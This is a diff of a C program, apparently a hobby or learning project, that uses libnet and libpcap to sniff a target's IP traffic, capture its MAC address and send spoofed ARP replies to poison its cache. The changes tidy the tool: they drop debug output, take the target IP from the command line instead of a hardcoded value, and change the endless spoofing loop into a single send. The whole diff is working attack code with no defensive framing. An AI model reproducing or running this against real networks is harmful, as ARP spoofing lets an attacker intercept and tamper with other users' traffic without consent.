@@ -66,13 +66,6 @@ void send_arp(int spoof) {
 
     l = libnet_init(LIBNET_LINK, NULL, errbuf);
     if (l == NULL) exit(-1);
-/*
-    printf("%x - %x\n",s_haddr[0],r_haddr[0]);
-    printf("%x - %x\n",s_haddr[1],r_haddr[1]);
-    printf("%x - %x\n",s_haddr[2],r_haddr[2]);
-    printf("%x - %x\n",s_haddr[3],r_haddr[3]);
-    printf("%x - %x\n",s_haddr[4],r_haddr[4]);
-    printf("%x - %x\n",s_haddr[5],r_haddr[5]);*/
 
     if (spoof==1)
     {
@@ -84,7 +77,6 @@ void send_arp(int spoof) {
           libnet_destroy(l);
           exit(-1);
         }
-        //printf("%x %x %x %x\n",s_haddr, (u_int8_t*)(&g_ip_addr), r_haddr, (u_int8_t*)(&r_ip_addr));
         printf("[+] Done!\n");
     }else{
         if (libnet_autobuild_arp(ARPOP_REQUEST, s_haddr, (u_int8_t*)(&s_iaddr), mac_zero_addr, (u_int8_t*)(&r_iaddr), l) == -1){
@@ -143,10 +135,6 @@ void *scan_arp()
     pcd = pcap_open_live(device, BUFSIZ,  1, -1, errbuf);
     if (!pcd) exit(1);
 
-    /*if (pcap_compile(pcd, &filter, "arp", 1, maskp) == -1) exit(1);
-
-    if (pcap_setfilter(pcd,&filter) == -1) exit(1);
-*/
     while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0){
         if (res == 0) continue;
         ep = (struct ether_header *)packet;
@@ -156,17 +144,16 @@ void *scan_arp()
 
         if (ether_type == ETHERTYPE_IP)
         {
-            //printf("%s \n",inet_ntoa(iph->ip_src));
             r_haddr[0]='\0';
-            
-            if(strcmp(inet_ntoa(iph->ip_src), "192.168.132.129")==0) //Recv and Parse Recever's MAC
+
+            if(strcmp(inet_ntoa(iph->ip_src), r_iaddr)==0) //Recv and Parse Recever's MAC
             {
                 for (i=0; i<ETH_ALEN-1; ++i)
                 {
                     sprintf(tmp1,"%s%02x:",tmp1,ep->ether_shost[i]);
                 }
                 sprintf(tmp1,"%s%02x",tmp1,ep->ether_shost[i]);
-                printf("%sI",tmp1);
+
                 tmp2 = strtok(tmp1,":");
                 i=0;
                 while(tmp2 != NULL)
@@ -175,9 +162,11 @@ void *scan_arp()
                     tmp2 = strtok(NULL, ":");
                     i++;
                 }
-                printf("[+] Detected!");
+                printf("[+] Detected! - %s\n",r_iaddr);
                 printf("[+] Start ARP Spoofing...\n");
-                while(1) send_arp(1); //Send ARP Spoofing Packet
+                //while(1)
+                send_arp(1); //Send ARP Spoofing Packet
+                exit(0);
             }
         }
     }
@@ -190,9 +179,10 @@ int main(int argc, char *argv[])
     char *tmp2;
     
     strncpy(r_iaddr,argv[1],15);
-    printf("%s",r_iaddr);
+    strncpy(tmp3,r_iaddr,15);
+
     i=0;
-    tmp2 = strtok(r_iaddr,".");
+    tmp2 = strtok(tmp3,".");
     while(tmp2 != NULL)
     {
         tmp3[i] = strtoul(tmp2,NULL,10);
@@ -213,11 +203,7 @@ int main(int argc, char *argv[])
         exit(-1);
     }
 
-    printf("PThread End\n");
-
-
     pthread_join(thread_t, (void **)NULL);
 
     return 0;
 }
-
